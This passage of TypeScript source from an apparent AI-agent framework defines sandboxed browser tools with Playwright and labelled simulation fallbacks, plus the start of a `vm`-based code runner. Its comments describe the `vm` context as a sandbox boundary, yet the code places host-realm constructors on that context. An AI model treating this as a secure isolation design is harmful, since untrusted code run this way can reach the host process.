            runtime: 'sandbox',
            ok: true,
            output: `Opened ${result.url} — ${result.title}`,
            metadata: { url: result.url, title: result.title, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.open',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated browser navigation to ${url}`,
          metadata: { url, finalUrl: url, simulated: true }
        };
      }

      const result = await sandbox.goto(url);
      return {
        toolName: 'browser.open',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Opened ${result.finalUrl ?? url}` : `Failed to open ${url}`,
        metadata: { url, finalUrl: result.finalUrl ?? url, title: result.title }
      };
    }
  };
}

function renderSimulatedBrowserSnapshot(url: string, full: boolean): string {
  return full
    ? [
        `Page snapshot for ${url}`,
        '[@e1] heading "Example Domain"',
        '[@e2] link "More information..."',
        '[@e3] document "Static example content"'
      ].join('\n')
    : [
        `Snapshot for ${url}`,
        '[@e1] heading "Example Domain"',
        '[@e2] link "More information..."'
      ].join('\n');
}

function renderSimulatedBrowserImages(url: string): Array<{ ref: string; src: string; alt: string }> {
  return [
    { ref: '@img1', src: `${url.replace(/\/$/, '')}/hero.png`, alt: 'Hero image' },
    { ref: '@img2', src: `${url.replace(/\/$/, '')}/diagram.png`, alt: 'Diagram image' }
  ];
}

export function createBrowserNavigateTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.navigate',
      description: 'Navigates to a URL in a sandbox browser/session surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      if (!url) {
        return {
          toolName: 'browser.navigate',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: {}
        };
      }

      const sandbox = resolveSandbox(context) as unknown as {
        goto?: (targetUrl: string) => Promise<{ success: boolean; finalUrl?: string; title?: string }>;
      } | null;

      if (!sandbox?.goto) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.goto(url);
          return {
            toolName: 'browser.navigate',
            runtime: 'sandbox',
            ok: true,
            output: `Opened ${result.url} — ${result.title}`,
            metadata: { url: result.url, title: result.title, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.navigate',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated browser navigation to ${url}`,
          metadata: { url, finalUrl: url, simulated: true }
        };
      }

      const result = await sandbox.goto(url);
      return {
        toolName: 'browser.navigate',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Opened ${result.finalUrl ?? url}` : `Failed to open ${url}`,
        metadata: { url, finalUrl: result.finalUrl ?? url, title: result.title }
      };
    }
  };
}

export function createBrowserSnapshotTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.snapshot',
      description: 'Returns a text snapshot of the current page with stable ref-like IDs.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const full = Boolean(input.full);
      if (!url) {
        return {
          toolName: 'browser.snapshot',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: { full }
        };
      }

      const sandbox = resolveSandbox(context) as unknown as {
        snapshot?: (
          targetUrl: string,
          options?: { full?: boolean }
        ) => Promise<{ success: boolean; snapshot?: string; refs?: string[]; title?: string; full?: boolean }>;
      } | null;

      if (!sandbox?.snapshot) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.snapshot();
          return {
            toolName: 'browser.snapshot',
            runtime: 'sandbox',
            ok: true,
            output: result.text,
            metadata: { url: result.url, full, title: result.title, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.snapshot',
          runtime: 'sandbox',
          ok: true,
          output: renderSimulatedBrowserSnapshot(url, full),
          metadata: { url, full, refs: full ? ['@e1', '@e2', '@e3'] : ['@e1', '@e2'], simulated: true }
        };
      }

      const result = await sandbox.snapshot(url, { full });
      return {
        toolName: 'browser.snapshot',
        runtime: 'sandbox',
        ok: result.success,
        output: result.snapshot ?? '',
        metadata: { url, full: result.full ?? full, refs: result.refs ?? [], title: result.title }
      };
    }
  };
}

export function createBrowserWaitForTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.waitFor',
      description: 'Waits for a selector or page condition in a sandbox browser/session surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const selector = typeof input.selector === 'string' ? input.selector : 'body';
      const timeoutMs = typeof input.timeoutMs === 'number' ? input.timeoutMs : 5_000;
      if (!url) {
        return {
          toolName: 'browser.waitFor',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: { selector, timeoutMs }
        };
      }

      const sandbox = resolveSandbox(context) as unknown as {
        waitFor?: (
          targetUrl: string,
          options?: { selector?: string; timeoutMs?: number }
        ) => Promise<{ success: boolean; selector?: string; timeoutMs?: number; finalUrl?: string; matched?: boolean }>;
      } | null;

      if (!sandbox?.waitFor) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.waitFor(selector, { timeout: timeoutMs });
          return {
            toolName: 'browser.waitFor',
            runtime: 'sandbox',
            ok: true,
            output: result.matched
              ? `Waited for ${selector} at ${result.url}`
              : `Timed out waiting for ${selector} at ${result.url}`,
            metadata: { url: result.url, selector, timeoutMs, matched: result.matched, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.waitFor',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated wait for ${selector} at ${url}`,
          metadata: { url, selector, timeoutMs, simulated: true, matched: true, finalUrl: url }
        };
      }

      const result = await sandbox.waitFor(url, { selector, timeoutMs });
      return {
        toolName: 'browser.waitFor',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success
          ? `Waited for ${result.selector ?? selector} at ${result.finalUrl ?? url}`
          : `Timed out waiting for ${result.selector ?? selector} at ${result.finalUrl ?? url}`,
        metadata: {
          url,
          selector: result.selector ?? selector,
          timeoutMs: result.timeoutMs ?? timeoutMs,
          finalUrl: result.finalUrl ?? url,
          matched: result.matched ?? result.success
        }
      };
    }
  };
}

export function createBrowserExtractTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.extract',
      description: 'Extracts simple page fields from a sandbox browser/session surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const selector = typeof input.selector === 'string' ? input.selector : 'body';
      const sandbox = resolveSandbox(context) as unknown as {
        extract?: (targetUrl: string, options?: { selector?: string }) => Promise<{ success: boolean; content?: string; html?: string; text?: string }>;
      } | null;

      if (!url) {
        return {
          toolName: 'browser.extract',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: { selector }
        };
      }

      if (!sandbox?.extract) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.extract(selector);
          return {
            toolName: 'browser.extract',
            runtime: 'sandbox',
            ok: true,
            output: result.content,
            metadata: { url: result.url, selector, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.extract',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated extraction for ${url} (${selector})`,
          metadata: { url, selector, simulated: true }
        };
      }

      const result = await sandbox.extract(url, { selector });
      const output = result.content ?? result.text ?? result.html ?? '';
      return {
        toolName: 'browser.extract',
        runtime: 'sandbox',
        ok: result.success,
        output,
        metadata: { url, selector }
      };
    }
  };
}

export function createBrowserClickTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.click',
      description: 'Clicks a selector in a sandbox browser/session surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const selector = typeof input.selector === 'string' ? input.selector : '';
      if (!url || !selector) {
        return {
          toolName: 'browser.click',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url or selector.',
          metadata: { url, selector }
        };
      }

      const sandbox = resolveSandbox(context) as unknown as {
        click?: (targetUrl: string, options?: { selector?: string }) => Promise<{ success: boolean; finalUrl?: string }>;
      } | null;

      if (!sandbox?.click) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.click(selector);
          return {
            toolName: 'browser.click',
            runtime: 'sandbox',
            ok: true,
            output: `Clicked ${selector} at ${result.url}`,
            metadata: { url: result.url, selector, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.click',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated click on ${selector} at ${url}`,
          metadata: { url, selector, simulated: true, finalUrl: url }
        };
      }

      const result = await sandbox.click(url, { selector });
      return {
        toolName: 'browser.click',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Clicked ${selector} at ${url}` : `Failed to click ${selector} at ${url}`,
        metadata: { url, selector, finalUrl: result.finalUrl ?? url }
      };
    }
  };
}

export function createBrowserTypeTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.type',
      description: 'Types text into a selector in a sandbox browser/session surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const selector = typeof input.selector === 'string' ? input.selector : '';
      const text = typeof input.text === 'string' ? input.text : '';
      if (!url || !selector) {
        return {
          toolName: 'browser.type',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url or selector.',
          metadata: { url, selector }
        };
      }

      const sandbox = resolveSandbox(context) as unknown as {
        type?: (targetUrl: string, options?: { selector?: string; text?: string }) => Promise<{ success: boolean; finalUrl?: string }>;
      } | null;

      if (!sandbox?.type) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.type(selector, text);
          return {
            toolName: 'browser.type',
            runtime: 'sandbox',
            ok: true,
            output: `Typed into ${selector} at ${result.url}`,
            metadata: { url: result.url, selector, text, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.type',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated typing into ${selector} at ${url}`,
          metadata: { url, selector, text, simulated: true, finalUrl: url }
        };
      }

      const result = await sandbox.type(url, { selector, text });
      return {
        toolName: 'browser.type',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Typed into ${selector} at ${url}` : `Failed to type into ${selector} at ${url}`,
        metadata: { url, selector, text, finalUrl: result.finalUrl ?? url }
      };
    }
  };
}

export function createBrowserBackTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.back',
      description: 'Navigates back in browser history.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'low'
    },
    async execute(input, context) {
      const steps = typeof input.steps === 'number' ? input.steps : 1;
      const sandbox = resolveSandbox(context) as unknown as {
        back?: (options?: { steps?: number }) => Promise<{ success: boolean; steps?: number; finalUrl?: string }>;
      } | null;

      if (!sandbox?.back) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.back();
          return {
            toolName: 'browser.back',
            runtime: 'sandbox',
            ok: true,
            output: `Navigated back ${steps} step(s)`,
            metadata: { steps, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.back',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated browser back (${steps})`,
          metadata: { steps, simulated: true, finalUrl: 'about:blank' }
        };
      }

      const result = await sandbox.back({ steps });
      return {
        toolName: 'browser.back',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Navigated back ${result.steps ?? steps} step(s)` : `Failed to navigate back ${steps} step(s)`,
        metadata: { steps: result.steps ?? steps, finalUrl: result.finalUrl }
      };
    }
  };
}

export function createBrowserScrollTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.scroll',
      description: 'Scrolls inside a browser surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'low'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const direction = input.direction === 'up' || input.direction === 'left' ? input.direction : 'down';
      const amount = typeof input.amount === 'number' ? input.amount : 1;
      const sandbox = resolveSandbox(context) as unknown as {
        scroll?: (targetUrl: string, options?: { direction?: string; amount?: number }) => Promise<{ success: boolean; direction?: string; amount?: number; finalUrl?: string }>;
      } | null;

      if (!url) {
        return {
          toolName: 'browser.scroll',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: { direction, amount }
        };
      }

      if (!sandbox?.scroll) {
        return {
          toolName: 'browser.scroll',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated scroll ${direction} (${amount}) at ${url}`,
          metadata: { url, direction, amount, simulated: true, finalUrl: url }
        };
      }

      const result = await sandbox.scroll(url, { direction, amount });
      return {
        toolName: 'browser.scroll',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Scrolled ${result.direction ?? direction} (${result.amount ?? amount}) at ${url}` : `Failed to scroll ${direction} at ${url}`,
        metadata: { url, direction: result.direction ?? direction, amount: result.amount ?? amount, finalUrl: result.finalUrl ?? url }
      };
    }
  };
}

export function createBrowserPressTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.press',
      description: 'Presses a key in a browser surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'low'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const key = typeof input.key === 'string' ? input.key : '';
      const sandbox = resolveSandbox(context) as unknown as {
        press?: (targetUrl: string, options?: { key?: string }) => Promise<{ success: boolean; key?: string; finalUrl?: string }>;
      } | null;

      if (!url || !key) {
        return {
          toolName: 'browser.press',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url or key.',
          metadata: { url, key }
        };
      }

      if (!sandbox?.press) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.press(key);
          return {
            toolName: 'browser.press',
            runtime: 'sandbox',
            ok: true,
            output: `Pressed ${key} at ${result.url}`,
            metadata: { url: result.url, key, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.press',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated key press ${key} at ${url}`,
          metadata: { url, key, simulated: true, finalUrl: url }
        };
      }

      const result = await sandbox.press(url, { key });
      return {
        toolName: 'browser.press',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Pressed ${result.key ?? key} at ${url}` : `Failed to press ${key} at ${url}`,
        metadata: { url, key: result.key ?? key, finalUrl: result.finalUrl ?? url }
      };
    }
  };
}

export function createBrowserConsoleTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.console',
      description: 'Reads console logs from a browser surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'low'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const sandbox = resolveSandbox(context) as unknown as {
        consoleMessages?: (targetUrl: string) => Promise<{ success: boolean; logs?: Array<{ level: string; message: string }> }>;
      } | null;

      if (!url) {
        return {
          toolName: 'browser.console',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: {}
        };
      }

      if (!sandbox?.consoleMessages) {
        const logs = [{ level: 'info', message: `Simulated console log for ${url}` }];
        return {
          toolName: 'browser.console',
          runtime: 'sandbox',
          ok: true,
          output: JSON.stringify(logs, null, 2),
          metadata: { url, count: logs.length, simulated: true }
        };
      }

      const result = await sandbox.consoleMessages(url);
      const logs = result.logs ?? [];
      return {
        toolName: 'browser.console',
        runtime: 'sandbox',
        ok: result.success,
        output: JSON.stringify(logs, null, 2),
        metadata: { url, count: logs.length }
      };
    }
  };
}

export function createBrowserVisionTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.vision',
      description: 'Returns a vision summary of the page.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const prompt = typeof input.prompt === 'string' ? input.prompt : 'Describe the page.';
      const sandbox = resolveSandbox(context) as unknown as {
        vision?: (targetUrl: string, options?: { prompt?: string }) => Promise<{ success: boolean; analysis?: string }>;
      } | null;

      if (!url) {
        return {
          toolName: 'browser.vision',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: { prompt }
        };
      }

      if (!sandbox?.vision) {
        return {
          toolName: 'browser.vision',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated vision analysis for ${url}: ${prompt}`,
          metadata: { url, prompt, simulated: true }
        };
      }

      const result = await sandbox.vision(url, { prompt });
      return {
        toolName: 'browser.vision',
        runtime: 'sandbox',
        ok: result.success,
        output: result.analysis ?? '',
        metadata: { url, prompt }
      };
    }
  };
}

export function createBrowserImagesTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.images',
      description: 'Lists images from the current page with stable refs.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'low'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const limit = typeof input.limit === 'number' ? input.limit : 10;
      const sandbox = resolveSandbox(context) as unknown as {
        images?: (targetUrl: string, options?: { limit?: number }) => Promise<{ success: boolean; images?: Array<{ ref: string; src: string; alt?: string }> }>;
      } | null;

      if (!url) {
        return {
          toolName: 'browser.images',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: { limit }
        };
      }

      if (!sandbox?.images) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const imgs = await backend.getImages(limit);
          return {
            toolName: 'browser.images',
            runtime: 'sandbox',
            ok: true,
            output: JSON.stringify(imgs, null, 2),
            metadata: { url, count: imgs.length, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        const images = renderSimulatedBrowserImages(url).slice(0, limit);
        return {
          toolName: 'browser.images',
          runtime: 'sandbox',
          ok: true,
          output: JSON.stringify(images, null, 2),
          metadata: { url, count: images.length, simulated: true }
        };
      }

      const result = await sandbox.images(url, { limit });
      const images = (result.images ?? []).slice(0, limit);
      return {
        toolName: 'browser.images',
        runtime: 'sandbox',
        ok: result.success,
        output: JSON.stringify(images, null, 2),
        metadata: { url, count: images.length }
      };
    }
  };
}

export function createBrowserClickRefTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.clickRef',
      description: 'Clicks a stable ref-id from a browser snapshot.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      const ref = typeof input.ref === 'string' ? input.ref : '';
      const sandbox = resolveSandbox(context) as unknown as {
        clickRef?: (targetUrl: string, options?: { ref?: string }) => Promise<{ success: boolean; ref?: string; finalUrl?: string }>;
      } | null;

      if (!url || !ref) {
        return {
          toolName: 'browser.clickRef',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url or ref.',
          metadata: { url, ref }
        };
      }

      if (!sandbox?.clickRef) {
        return {
          toolName: 'browser.clickRef',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated click on ref ${ref} at ${url}`,
          metadata: { url, ref, simulated: true, finalUrl: url }
        };
      }

      const result = await sandbox.clickRef(url, { ref });
      return {
        toolName: 'browser.clickRef',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Clicked ${result.ref ?? ref} at ${url}` : `Failed to click ${ref} at ${url}`,
        metadata: { url, ref: result.ref ?? ref, finalUrl: result.finalUrl ?? url }
      };
    }
  };
}

// ---------------------------------------------------------------------------
// Registry helper
// ---------------------------------------------------------------------------

export function registerSandboxTools(registry: ToolRegistry, executor: SandboxClient): ToolRegistry {
  return registry
    .register(createTerminalTool(executor))
    .register(createFileReadTool(executor))
    .register(createFileWriteTool(executor))
    .register(createFileExistsTool(executor))
    .register(createFileDeleteTool(executor))
    .register(createCodeExecTool(executor))
    .register(createNodeExecTool(executor))
    .register(createPythonExecTool(executor))
    .register(createBrowserOpenTool())
    .register(createBrowserNavigateTool())
    .register(createBrowserGotoTool())
    .register(createBrowserSnapshotTool())
    .register(createBrowserBackTool())
    .register(createBrowserScrollTool())
    .register(createBrowserPressTool())
    .register(createBrowserConsoleTool())
    .register(createBrowserVisionTool())
    .register(createBrowserImagesTool())
    .register(createBrowserClickRefTool())
    .register(createBrowserWaitForTool())
    .register(createBrowserClickTool())
    .register(createBrowserTypeTool())
    .register(createBrowserExtractTool())
    .register(createBrowserScreenshotTool());
}

export async function runSandboxTool(
  tool: ToolDefinition,
  input: Record<string, unknown>,
  context: ToolExecutionContext
): Promise<ToolExecutionResult> {
  return tool.execute(input, context);
}

// ---------------------------------------------------------------------------
// Re-exports for new modules
// ---------------------------------------------------------------------------

export { PlaywrightBrowserBackend, getOrCreateBrowserBackend, closeBrowserBackend, isPlaywrightAvailable } from './playwright.js';
export { SshExecutor, type SshExecutorOptions } from './ssh.js';

// ---------------------------------------------------------------------------
// v0.8.0 #234 — `code.execute` pipeline tool
//
// Runs a JS/TS snippet inside a Node `vm` sandbox with access to a curated
// subset of host-registry tools via the tool-rpc bridge. Used by the
// `code.execute` tool in `@crowclaw/tools`. The function is deliberately
// generic — it accepts any ToolRegistry-shaped object plus a SandboxPolicy,
// and emits `code:start` / `code:tool_called` / `code:complete` lifecycle
// events on the supplied EventBus (the runtime-node EventBus already declares
// these types; see packages/runtime-node/src/event-bus.ts).
//
// Sandbox boundary:
//   - Code runs in `vm.runInContext` with a fresh context object.
//   - No `require`, no `process`, no `import` from user code (we don't expose
//     them on the context). The only escape is `tools.*`, which routes through
//     the host bridge (which itself enforces allowedTools / hardline / approval).
//   - `console.log` / `console.error` are captured into stdout / stderr.
//   - Hard 30s default timeout via `vm`'s `timeout` option AND a parallel
//     setTimeout that aborts the host signal. Tear-down is in `finally`.
//
// Why we don't reuse `executeCodeCommand` (the existing `code.exec` path):
//   `code.exec` shells out to `node -e`, which is fine for terminal-style
//   workloads but cannot share a tool bridge with the host process — the
//   subprocess can't access the host's tool registry without re-implementing
//   IPC. `executeWithTools` runs in-process, so the bridge is just a JS call.
// ---------------------------------------------------------------------------
import { createHostBridge, type ToolCallRecord } from './tool-rpc.js';
import type { SandboxPolicy } from './policy.js';
import { DEFAULT_SANDBOX_POLICY } from './policy.js';
import type { AgentEventEmitter, ToolCall } from '@crowclaw/core';
import { createHash } from 'node:crypto';

export type { SandboxPolicy } from './policy.js';
export {
  SandboxPolicyError,
  DEFAULT_SANDBOX_POLICY,
  makePolicy,
  type SandboxPolicyErrorCode,
} from './policy.js';
export {
  createHostBridge,
  buildShimSource,
  type HostBridge,
  type ToolRpcRequest,
  type ToolRpcResponse,
  type ToolCallRecord,
  type CreateHostBridgeOptions,
} from './tool-rpc.js';

export interface ExecuteWithToolsOptions {
  /** Source code to execute. */
  code: string;
  /** 'js' | 'ts' supported in v0.8.0; 'python' is reserved (deferred). */
  language: 'js' | 'ts' | 'python';
  toolRegistry: ToolRegistry;
  sessionId: string;
  agentId?: string;
  workspaceId?: string;
  delegateDepth?: number;
  policy?: Partial<SandboxPolicy>;
  eventBus?: AgentEventEmitter;
  /** Same-path `executeTool` callback — see CreateHostBridgeOptions. */
  executeTool?: (
    toolCall: ToolCall,
    context: import('@crowclaw/core').ToolExecutionContext
  ) => Promise<ToolExecutionResult>;
  hardlineBlocklist?: ReadonlyArray<{ pattern: RegExp; description: string }>;
  signal?: AbortSignal;
  env?: unknown;
}

export interface ExecuteWithToolsResult {
  ok: boolean;
  returnValue?: unknown;
  stdout: string;
  stderr: string;
  toolCalls: ToolCallRecord[];
  durationMs: number;
  error?: string;
}

function hashCode(code: string): string {
  return createHash('sha256').update(code, 'utf8').digest('hex').slice(0, 16);
}

function clipBuffer(parts: string[], maxBytes: number): string {
  let out = '';
  for (const p of parts) {
    if (out.length + p.length > maxBytes) {
      out += p.slice(0, Math.max(0, maxBytes - out.length));
      out += `\n[truncated: stream exceeded ${maxBytes} bytes]`;
      break;
    }
    out += p;
  }
  return out;
}

export async function executeWithTools(
  options: ExecuteWithToolsOptions
): Promise<ExecuteWithToolsResult> {
  const policy: SandboxPolicy = { ...DEFAULT_SANDBOX_POLICY, ...(options.policy ?? {}) };
  const startedAt = Date.now();
  const codeHash = hashCode(options.code);

  options.eventBus?.emit('code:start', {
    sessionId: options.sessionId,
    language: options.language,
    codeHash,
  });

  if (options.language === 'python') {
    const durationMs = Date.now() - startedAt;
    options.eventBus?.emit('code:complete', {
      sessionId: options.sessionId,
      ok: false,
      durationMs,
      toolCallCount: 0,
    });
    return {
      ok: false,
      stdout: '',
      stderr: 'Python sandbox is deferred in v0.8.0; only "js"/"ts" are supported.',
      toolCalls: [],
      durationMs,
      error: 'LanguageNotSupported',
    };
  }

  // We import `node:vm` lazily so the cloudflare-sandbox alias used in tests
  // doesn't blow up at module-eval time on workers (vm doesn't exist there).
  let vm: typeof import('node:vm');
  try {
    vm = await import('node:vm');
  } catch (err) {
    const durationMs = Date.now() - startedAt;
    const message = err instanceof Error ? err.message : String(err);
    options.eventBus?.emit('code:complete', {
      sessionId: options.sessionId,
      ok: false,
      durationMs,
      toolCallCount: 0,
    });
    return {
      ok: false,
      stdout: '',
      stderr: `node:vm unavailable: ${message}`,
      toolCalls: [],
      durationMs,
      error: 'VmUnavailable',
    };
  }

  // Compose the host bridge — the same allowedTools list goes into the shim
  // source so user code can introspect what's available.
  const bridge = createHostBridge({
    toolRegistry: options.toolRegistry,
    sessionId: options.sessionId,
    agentId: options.agentId,
    workspaceId: options.workspaceId,
    delegateDepth: options.delegateDepth,
    policy,
    eventBus: options.eventBus,
    executeTool: options.executeTool,
    hardlineBlocklist: options.hardlineBlocklist,
    signal: options.signal,
    env: options.env,
  });

  // stdout / stderr capture
  const stdoutBuf: string[] = [];
  const stderrBuf: string[] = [];
  const fmt = (args: unknown[]): string =>
    args
      .map((a) => {
        if (typeof a === 'string') return a;
        try {
          return JSON.stringify(a);
        } catch {
          return String(a);
        }
      })
      .join(' ') + '\n';
  const fakeConsole = {
    log: (...args: unknown[]) => stdoutBuf.push(fmt(args)),
    info: (...args: unknown[]) => stdoutBuf.push(fmt(args)),
    warn: (...args: unknown[]) => stderrBuf.push(fmt(args)),
    error: (...args: unknown[]) => stderrBuf.push(fmt(args)),
    debug: (...args: unknown[]) => stdoutBuf.push(fmt(args)),
  };

  // Build the sandboxed globalThis. Note we deliberately don't expose
  // `require`, `process`, `Buffer`, or the timer family of bypasses; user code
  // can only reach the host through the `tools` shim.
  const sandboxGlobal: Record<string, unknown> = {
    console: fakeConsole,
    setTimeout,
    clearTimeout,
    Promise,
    JSON,
    Math,
    Date,
    URL,
    URLSearchParams,
    TextEncoder,
    TextDecoder,
    Error,
    Object,
    Array,
    String,
    Number,
    Boolean,
    Symbol,
    RegExp,
    Map,
    Set,
    WeakMap,
    WeakSet,
    __crowclawHostBridge: {
      call: (req: { id: number; tool: string; args: unknown }) => bridge.handleRequest(req),
    },
  };
  // Self-reference for `globalThis`-style access (the shim uses `globalThis`).
  sandboxGlobal.globalThis = sandboxGlobal;

  const context = vm.createContext(sandboxGlobal, {
    name: `crowclaw-sandbox-${options.sessionId}`,
    codeGeneration: { strings: false, wasm: false },
  });

  // Wrap user code in an async IIFE so we can `await` and return a value.
  // TypeScript "support" in v0.8.0 is type-strip only — we don't compile, we
  // just feed the source to V8 which tolerates simple TS in many cases. Real
  // TS support is deferred; the manifest still advertises 'ts' so the agent
  // can opt in once the compiler step lands.
  const userBody = options.language === 'ts'
    ? `// NOTE: TS sources are passed to V8 as-is in v0.8.0; type annotations\n// outside of the standard JS subset will throw a SyntaxError. Stick to\n// type-erasable syntax (no enums, no decorators, no namespace imports).\n${options.code}`
    : options.code;
  const wrapped = `(async () => {\n${bridge.shimSource}\n;return (async () => {\n${userBody}\n})();\n})()`;

  const abortController = new AbortController();
  if (options.signal) {
    if (options.signal.aborted) abortController.abort();
    else options.signal.addEventListener('abort', () => abortController.abort(), { once: true });
  }

